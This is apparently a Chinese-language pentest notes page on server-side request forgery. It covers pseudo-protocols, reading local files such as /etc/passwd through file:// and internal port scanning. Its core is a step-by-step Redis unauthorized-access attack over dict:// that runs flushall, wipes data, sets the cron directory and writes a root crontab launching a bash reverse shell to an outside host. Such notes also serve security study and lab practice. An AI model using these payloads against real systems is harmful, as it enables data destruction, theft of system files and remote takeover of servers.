+++
title = "SSRF"
+++

## 伪协议

<https://www.sqlsec.com/2021/05/ssrf.html>

### file://

从文件系统中获取文件内容

### dict://

字典服务协议，访问字典资源，如`dict:///ip:6739/info`（Redis命令执行）

可用于端口扫描

### gopher://

分布式文档传递服务

### ftp://

可用于网络端口扫描，响应时间长的端口可能是开放的，但是扫描速度太慢

### sftp://

SSH文件传输协议

### ldap://

轻量级目录访问协议

### tftp://

简单文件传输协议

## 获取本地信息

- 读取passwd：`file:///etc/passwd`
- 本机IP：`file:///etc/hosts`
- arp缓存表：`file:///proc/net/arp`
  - 可以通过http等访问批量ip，再查看arp缓存表，实现内网扫描
- 网段路由信息：`file:///proc/net/fib_trie`

## 探测内网端口

SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口

通过Burpsuite的Intruder

## 通过 SSRF 进行 XXE 攻击

先来抓取正常情况下 XXE 攻击的 POST 请求的数据包，删除掉 Accept-Encoding 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码

<https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-25-XML-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5>

## CVE-2017-12615

Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞

<https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-26-CVE-2017-12615>

## Redis 未授权

`dict://x.x.x.x:6379/<Redis 命令>`

```bash
+++
title = "清空 key"
+++
dict://172.72.23.27:6379/flushall

+++
title = "设置要操作的路径为定时任务目录"
+++
dict://172.72.23.27:6379/config set dir /var/spool/cron/

+++
title = "在定时任务目录下创建 root 的定时任务文件"
+++
dict://172.72.23.27:6379/config set dbfilename root

+++
title = "写入 Bash 反弹 shell 的 payload"
+++
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

+++
title = "保存上述操作"
+++
dict://172.72.23.27:6379/save
```

> SSRF 传递的时候记得要把 & URL 编码为 %26，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码

## Redis 有认证

<https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-28-Redis-%E6%9C%89%E8%AE%A4%E8%AF%81>

## MySQL 未授权

<https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-MySQL-%E6%9C%AA%E6%8E%88%E6%9D%83>
